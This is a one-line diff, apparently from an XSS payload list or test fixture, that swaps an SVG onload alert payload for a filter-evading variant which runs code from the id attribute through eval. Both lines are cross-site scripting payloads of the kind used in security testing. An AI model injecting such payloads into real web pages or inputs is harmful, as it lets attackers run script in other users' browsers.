@@ -1,1 +1,1 @@
-<svg/onload=alert('XSS')>
+<svg id=alert(1) onload=eval(id)>
